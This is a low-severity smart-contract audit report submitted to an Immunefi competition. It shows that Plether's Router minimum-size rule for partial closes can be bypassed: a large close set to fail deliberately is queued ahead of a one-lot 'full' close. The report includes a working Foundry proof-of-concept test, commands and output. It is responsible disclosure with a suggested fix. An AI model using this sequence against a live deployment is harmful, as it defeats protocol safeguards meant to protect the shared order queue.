# \#99663 [SC-Low] Incomplete LOW-44 fix allows a dust partial close to bypass the configured minimum after an earlier queued close fails

**Submitted on Nov 14th 2026 at 18:04:32 UTC by @manvi for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99663
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description


## Brief / Introduction

I found a way to commit and execute a below-minimum partial close even though the Router has the LOW-44 minimum-order-size fix in place.

The LOW-44 fix rejects partial closes whose notional is smaller than the configured `minOpenNotionalAssets`. Full closes are exempt so a trader can exit a small remaining position. The problem is that the Router decides whether a close is full by looking at a *projected* position after earlier pending orders, rather than the position that will necessarily exist when the close executes.

A previous close is not guaranteed to execute. I can queue a large close with a target price that cannot be met, then queue a one-lot close behind it. The projection assumes the first close will succeed and leaves one lot outstanding, so the second close is admitted as a full residual close. When execution begins, the large close fails on slippage. The one-lot close then executes against the original position as an ordinary partial close, without a new minimum-notional check.

I reproduced this with the release minimum of `1,000 USDG` and a constant mark of `1.00000000`. A direct `100 USDG` partial close is rejected at commitment. The same `100 USDG` close commits and executes when it follows a `9,900 USDG` close that later fails. The position changes from 100 lots to 99 lots. The two tests pass against the frozen competition commit, with no changes to `packages/perps/src`.

## Vulnerability Details

### 1. LOW-44 fixes the direct admission path, but retains the full-close exception

Cecuro LOW-44 reported that partial closes were not consistently checked against the Router's configured minimum order size. The original logic derived the close floor from the Engine's liquidation bounty parameters instead of applying the Router's order-size setting.

The project's LOW-44 response says the partial-close admission check now uses the configured minimum and keeps an intentional exception for full closes. The audited source does enforce that rule on the direct path. My first control confirms that a one-lot partial close submitted against a 100-lot live position reverts with `OrderRouter__CommitValidation(11)`.

The missing case is a close that appears to be *full only because of earlier queued orders*.

### 2. The full-close exemption is based on a projected position, not the live position

`OrderLiquidationBatchLogic._validateCloseAdmission()` obtains `queuedPosition` and applies the minimum only where `sizeDelta` is smaller than that projected position size:

```solidity
QueuedPositionView memory queuedPosition = _queuedPosition(host, engine, account);
OrderValidationLib.validateCloseCommit(
    queuedPosition.exists, queuedPosition.size, queuedPosition.side, side, sizeDelta
);

uint256 commitPrice = _commitReferencePrice(engine);
if (
    sizeDelta < queuedPosition.size
        && (sizeDelta / CfdTypes.SIZE_QUANTUM) * commitPrice < host.minOpenNotionalAssets()
) {
    revert OrderRouter__CommitValidation(11);
}
```

The comparison has a blind spot. When `sizeDelta == queuedPosition.size`, it treats the proposed order as a full residual close regardless of whether earlier pending closes actually execute.

### 3. `_queuedPosition` subtracts earlier pending closes before knowing their outcomes

`OrderLiquidationBatchLogic._queuedPosition()` starts from the live Engine position and walks the account's pending orders. When it encounters an earlier close on the same side, it subtracts that close's requested size from the projection:

```solidity
if (pending.isClose) {
    if (queuedPosition.exists && pending.side == queuedPosition.side) {
        queuedPosition.size =
            queuedPosition.size > pending.sizeDelta
                ? queuedPosition.size - pending.sizeDelta
                : 0;
        if (queuedPosition.size == 0) {
            queuedPosition.exists = false;
        }
    }
}
```

That projection is useful for orderly sequencing, but an earlier pending close may terminate without modifying the position. A projected residual is therefore not proof that the next order will be a full close when it executes.

In my test, Alice has 100 lots. After queuing a 99-lot close, the projected position is one lot. A second close for that remaining lot is admitted without the `1,000 USDG` minimum even though the live position is still 100 lots.

### 4. The first close fails terminally on its own target price

For a LONG close, `OrderValidationLib.checkSlippage()` requires the execution price to be at or below the submitted target:

```solidity
if (order.isClose) {
    if (order.side == CfdTypes.Side.LONG) {
        return executionPrice <= order.targetPrice;
    }
    return executionPrice >= order.targetPrice;
}
```

I submit the 99-lot LONG close with `targetPrice = 1`, equal to `0.00000001` in the eight-decimal price format. The actual execution price is `1.00000000`, so the close fails with `LifecycleStatus.Failed` and `TerminalReason.Slippage`. The Engine position remains 100 lots, and the FIFO head advances to the waiting one-lot close.

### 5. Execution never reapplies the minimum to the actual partial close

When the second order executes, it requests one full size quantum and is smaller than the 100-lot live position. The Engine's close planner accepts the lot alignment and live-position size. It does not enforce the Router's `minOpenNotionalAssets` floor on that execution path.

The second order therefore executes successfully, leaving 99 lots open. Its `100 USDG` notional is one tenth of the configured `1,000 USDG` minimum.

The original LOW-44 fix remains effective on direct commitment, but fails to cover a full-close exemption obtained through an earlier queued close that does not execute.

## Reproduction and Measurements

I used the repository's `BasePerpTest` fixture, normal V3 `commitOrder` and `executeOrder` entrypoints, and release risk parameters. The Router's `minOpenNotionalAssets` is set to the `1_000e6` value given in `DEPLOYMENT.md`. The basket price is held at `1.00000000` in both tests. A one-lot position size quantum represents 100 USDG of notional at that price.

| Step | Order or state | Result |
|---|---|---|
| Initial position | Alice LONG, 100 lots | 10,000 USDG notional |
| Direct-path control | One-lot / 100 USDG partial close | Reverts with `OrderRouter__CommitValidation(11)` |
| First queued order | Close 99 lots / 9,900 USDG, `targetPrice = 1` | Admitted; later fails on slippage |
| Projected position after first order | 1 lot | Used for the next commitment's full-close classification |
| Second queued order | Close 1 lot / 100 USDG | Admitted as projected full residual close |
| First execution | 99-lot close | `Failed`, `Slippage`; live position remains 100 lots |
| Second execution | One-lot close | `Executed`; live position becomes 99 lots |
| Configured minimum | `minOpenNotionalAssets = 1_000e6` | 1,000 USDG |
| Actual executed partial close | `100e6` | 100 USDG, **10 times smaller** than the minimum |

The control and exploit tests ran on commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with Foundry 1.5.1 and Solidity 0.8.35. Both passed. The detailed-trace runs also returned exit status zero.

## Impact Details

The Router advertises and enforces an economic minimum for partial closes, with a narrow exception for full residual exits. This sequence defeats that minimum on demand. A trader can commit a below-minimum partial close that a direct commitment would reject, and the close executes against a larger live position after a deliberately unfillable predecessor fails.

The distinction matters because every accepted close still enters the shared FIFO order system. The minimum-size rule is meant to stop dust partial closes from entering the global queue; `SECURITY.md` explicitly lists this protection and states that only true full residual closes may fall below the notional floor. The bypass allows the very class of partial close that the rule was designed to exclude.

The same report does not depend on a privileged caller, a manipulated oracle value, or a modified protocol contract. Alice is an ordinary trader. Execution is permissionless. The bypass occurs with the release threshold and a price of 1.00.

The demonstrated impact is the failure of the configured partial-close size restriction. My test does not require or establish direct fund loss, a global queue shutdown, or a larger-than-quantum rounding attack. The executed order is one permitted size quantum, but its notional is below the separate configured minimum that should apply to partial closes.

## Why this is an incomplete LOW-44 fix

The existing Cecuro finding addressed inconsistent minimum-size enforcement on partial closes. The project corrected the direct admission comparison and kept the exception for full closes. My reproduction takes the corrected code through another ordinary Router path and shows that a partial close is still admitted below the same configured minimum.

This is not the stated admission-price caveat in the LOW-44 response. The price is unchanged throughout the test. The classification changes because a previous close fails after the projection has already treated it as executed. The effective full-close exemption is applied to a transaction that later proves to be a partial close of the live position.

The same queued-position projection can legitimately be used for other order-admission rules, because later execution checks may reject an invalid sequence. Here the missing piece is the execution-time minimum check needed to make the admitted full-close exception safe when the predecessor fails.

## Suggested Remediation

Keep the ability to commit a genuine projected residual close, but recheck the full-close exemption when the order executes.

For any close admitted below `minOpenNotionalAssets`, compare its requested size with the actual position size immediately before execution. If it is not closing the entire live residual and its execution notional is below the configured minimum, finalize it as a failed order instead of executing it as a dust partial close. The check can use the admission-time capped mark or another explicitly specified notional reference, so an ordinary price change does not silently redefine the threshold.

Alternatively, change the commitment logic so speculative earlier closes cannot grant the below-minimum full-close exemption. A blanket rule requiring every close to equal the live position at commitment would be too restrictive for legitimate chained residual exits, so a targeted execution-time check is preferable.

## References

- [Affected Router admission and projected position logic — `OrderLiquidationBatchLogic.sol` lines 337–403](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L337-L403)
- [Directional slippage validation — `OrderValidationLib.sol` lines 60–83](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/OrderValidationLib.sol#L60-L83)
- [Execution-side slippage check — `OrderRouterExecutionSidecar.sol` lines 453–472](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L453-L472)
- [Engine close planning — `CfdEnginePlanLib.sol` lines 801–843](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L801-L843)
- [Release minimum and lot quantum — `DEPLOYMENT.md` lines 144–150](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L144-L150)
- [Economic close granularity invariant — `SECURITY.md` line 381](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L381)
- [Dust closes and shared FIFO — `SECURITY.md` line 657](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L657)
- [Cecuro audit, LOW-44 and project's fix response](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)
- [LOW-44 fix commit](https://github.com/Plether-Fi/plether-core/commit/b3a7665b6fda74a37759697fa015a1fe83b2063b)



## Proof of Concept

## Proof of Concept

## Environment

I used the frozen competition commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, Foundry 1.5.1 and Solidity 0.8.35. The test uses the repository's existing `BasePerpTest` setup, with simulated Pyth updates and USDG provided by the fixture. The attack does not write protocol storage through cheatcodes and does not modify contracts under `packages/perps/src`.

The test verifies that the direct one-lot partial-close commitment is rejected; then it submits two closes through the production Router, confirms the first fails, and verifies that the second executes below the minimum against the real position.

Save the Solidity file below as:

```text
packages/perps/test/perps/insight/LowFix_LOW44_PoC.t.sol
```

## Reproduction Commands

From the root of the checked-out repository:

```bash
cd /workspaces/audit-comp-plether
export PATH="$HOME/.foundry/bin:$PATH"

# The competition commit
git rev-parse HEAD

# Keep the compilation scope small, using the same fixture imports.
mkdir -p packages/perps/test/perps/low44_only
mkdir -p low44_evidence
cp packages/perps/test/perps/insight/LowFix_LOW44_PoC.t.sol \
  packages/perps/test/perps/low44_only/LowFix_LOW44_PoC.t.sol

# Both tests, including the direct-commit control.
FOUNDRY_TEST="test/perps/low44_only" \
forge test --root packages/perps --offline -j 1 --skip script \
  --match-path 'test/perps/low44_only/LowFix_LOW44_PoC.t.sol' \
  -vvv 2>&1 | tee low44_evidence/FINAL_ALL_TESTS.log

RESULT=${PIPESTATUS[0]}
echo "TEST EXIT STATUS: $RESULT"

# Isolate each test and retain the full traces.
FOUNDRY_TEST="test/perps/low44_only" \
forge test --root packages/perps --offline -j 1 --skip script \
  --match-path 'test/perps/low44_only/LowFix_LOW44_PoC.t.sol' \
  --match-test '^test_Control_DirectDustPartialCloseRejected$' \
  -vvvv > low44_evidence/CONTROL_TRACE.log 2>&1

echo "CONTROL TRACE EXIT STATUS: $?"

FOUNDRY_TEST="test/perps/low44_only" \
forge test --root packages/perps --offline -j 1 --skip script \
  --match-path 'test/perps/low44_only/LowFix_LOW44_PoC.t.sol' \
  --match-test '^test_PoC_DustPartialCloseBypassesMinimumViaQueuedProjection$' \
  -vvvv > low44_evidence/BYPASS_TRACE.log 2>&1

echo "BYPASS TRACE EXIT STATUS: $?"

# Check that the audited implementation is unchanged.
git diff HEAD -- packages/perps/src
sha256sum packages/perps/test/perps/insight/LowFix_LOW44_PoC.t.sol
```

## Complete Solidity Test Source

Source SHA-256: `56199e50873f581d56baad0b22c2cb7c412c318972a8bc6f58065e9bb8455538`  
Source lines: 168

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Incomplete LOW-44 fix: a queued but unfillable close makes a dust partial close
///         appear to be a full residual close at admission. Execution never repeats the floor.
contract LowFix_LOW44_PoC is BasePerpTest {
    address internal constant ALICE = address(0xA11CE);
    address internal constant KEEPER = address(0xBEE9E2);
    uint256 internal constant PRICE = 100_000_000;
    uint256 internal constant MIN_NOTIONAL = 1_000e6;
    uint256 internal constant LOT = CfdTypes.SIZE_QUANTUM; // 100 USDG at PRICE
    uint256 internal constant POSITION = 100 * LOT;
    uint256 internal constant FAILED_CLOSE = 99 * LOT;
    uint256 internal constant DUST_CLOSE = LOT;
    uint256 internal nonce = 1;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = MIN_NOTIONAL;
        _setRouterConfig(config);
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        router.updateMarkPrice(_live(PRICE));
        assertEq(router.minOpenNotionalAssets(), MIN_NOTIONAL, "minimum installed");
        _fundTrader(ALICE, 20_000e6);
        uint64 openId = _commit(_request(false, POSITION, 2_000e6, 1));
        uint256 committedAt = vm.getBlockTimestamp();
        OrderV3Types.ExecutionResult memory opened = _fill(openId, committedAt);
        assertEq(uint8(opened.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executed");
        assertEq(_size(), POSITION, "100 lots opened");
    }

    function test_Control_DirectDustPartialCloseRejected() public {
        uint64 nextIdBefore = router.nextCommitId();
        OrderV3Types.OrderRequest memory dust = _request(true, DUST_CLOSE, 0, type(uint256).max);
        vm.prank(ALICE);
        vm.expectRevert(abi.encodeWithSelector(IOrderRouterErrors.OrderRouter__CommitValidation.selector, uint8(11)));
        router.commitOrder(dust);
        assertEq(router.nextCommitId(), nextIdBefore, "rejected dust uses no order ID");
        assertEq(router.pendingOrderCounts(ALICE), 0, "rejected dust does not enter queue");
        assertEq(_size(), POSITION, "position unchanged");
    }

    function test_PoC_DustPartialCloseBypassesMinimumViaQueuedProjection() public {
        assertEq(DUST_CLOSE / LOT * PRICE, 100e6, "one-lot notional");
        assertLt(DUST_CLOSE / LOT * PRICE, router.minOpenNotionalAssets(), "dust below minimum");

        // This close leaves one lot in the queued projection, but cannot meet its target.
        uint64 first = _commit(_request(true, FAILED_CLOSE, 0, 1));
        uint256 firstCommitTime = vm.getBlockTimestamp();
        // Projection is 100 - 99 = one lot, so the floor is bypassed as a 'full close'.
        uint64 dust = _commit(_request(true, DUST_CLOSE, 0, type(uint256).max));
        uint256 dustCommitTime = vm.getBlockTimestamp();
        assertEq(router.pendingOrderCounts(ALICE), 2, "both closes entered queue");
        assertEq(router.pendingCloseSize(ALICE), POSITION, "projected remaining size is zero");
        assertEq(_size(), POSITION, "live position still 100 lots");

        OrderV3Types.ExecutionResult memory failed = _fill(first, firstCommitTime);
        assertEq(uint8(failed.status), uint8(OrderV3Types.LifecycleStatus.Failed), "99-lot close failed");
        assertEq(uint8(failed.terminalReason), uint8(OrderV3Types.TerminalReason.Slippage), "slippage failure");
        assertEq(_size(), POSITION, "99-lot close did not alter live position");
        assertEq(router.nextExecuteId(), dust, "dust close now at FIFO head");

        OrderV3Types.ExecutionResult memory executed = _fill(dust, dustCommitTime);
        assertEq(uint8(executed.status), uint8(OrderV3Types.LifecycleStatus.Executed), "dust close executed");
        assertEq(_size(), POSITION - DUST_CLOSE, "executed as partial close of live position");
        assertEq(router.pendingOrderCounts(ALICE), 0, "queue drained");

        console2.log("failed predecessor close notional (USDG 6dp):", FAILED_CLOSE / LOT * PRICE);
        console2.log("executed partial close notional (USDG 6dp):", DUST_CLOSE / LOT * PRICE);
        console2.log("configured minOpenNotionalAssets:", router.minOpenNotionalAssets());
        console2.log("remaining position lots:", _size() / LOT);
    }

    function _size() internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(ALICE);
    }

    function _commit(OrderV3Types.OrderRequest memory request) internal returns (uint64 id) {
        vm.prank(ALICE);
        id = router.commitOrder(request);
    }

    function _request(
        bool isClose,
        uint256 size,
        uint256 margin,
        uint256 target
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.ExecutionBounds memory b = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp()) + uint64(window),
            executionWindowSeconds: window,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(nonce++),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: isClose,
            bounds: b
        });
    }

    // Use the same signed historical price payload as the repository's V3 tests.
    function _fill(uint64 id, uint256 committedAt) internal returns (OrderV3Types.ExecutionResult memory result) {
        if (vm.getBlockTimestamp() <= committedAt) {
            vm.warp(committedAt + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(KEEPER);
        result = router.executeOrder(id, _ticks(PRICE, committedAt + 1, committedAt));
    }

    function _live(uint256 price) internal view returns (bytes[] memory) {
        return _ticks(price, vm.getBlockTimestamp(), vm.getBlockTimestamp() - 1);
    }

    function _ticks(uint256 price, uint256 published, uint256 previous)
        internal pure returns (bytes[] memory data)
    {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, published, previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }
}
```

## Recorded Test Output

The following output is from the completed Foundry run against the audited commit:

```text
Ran 2 tests for test/perps/low44_only/LowFix_LOW44_PoC.t.sol:LowFix_LOW44_PoC
[PASS] test_Control_DirectDustPartialCloseRejected() (gas: 177116)
[PASS] test_PoC_DustPartialCloseBypassesMinimumViaQueuedProjection() (gas: 2703899)
Logs:
  failed predecessor close notional (USDG 6dp): 9900000000
  executed partial close notional (USDG 6dp): 100000000
  configured minOpenNotionalAssets: 1000000000
  remaining position lots: 99

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 49.45ms (18.77ms CPU time)

Ran 1 test suite in 58.78ms (49.45ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)

========== FINAL RESULTS ==========
[PASS] test_Control_DirectDustPartialCloseRejected() (gas: 177116)
[PASS] test_PoC_DustPartialCloseBypassesMinimumViaQueuedProjection() (gas: 2703899)
  executed partial close notional (USDG 6dp): 100000000
  configured minOpenNotionalAssets: 1000000000
  remaining position lots: 99
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 49.45ms (18.77ms CPU time)

========== EXIT STATUS ==========
0

========== CAPTURE DETAILED TRACES ==========
========== test_Control_DirectDustPartialCloseRejected ==========
Trace exit status: 0
========== test_PoC_DustPartialCloseBypassesMinimumViaQueuedProjection ==========
Trace exit status: 0

========== AUDITED COMMIT ==========
a82d4fefb02768e5b3bddcc97dee371eee24fea8

========== PRODUCTION CONTRACT DIFF ==========

========== FINAL VERIFICATION ==========
[PASS] test_Control_DirectDustPartialCloseRejected() (gas: 177116)
[PASS] test_PoC_DustPartialCloseBypassesMinimumViaQueuedProjection() (gas: 2703899)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 49.45ms (18.77ms CPU time)
SUCCESS: BOTH LOW-44 TESTS PASSED
```

The control shows the direct path rejects the below-minimum partial close. The second test shows the same size can be admitted and executed after a failing predecessor, despite the unchanged configured minimum. Both tests passed without changes to the contracts in scope.


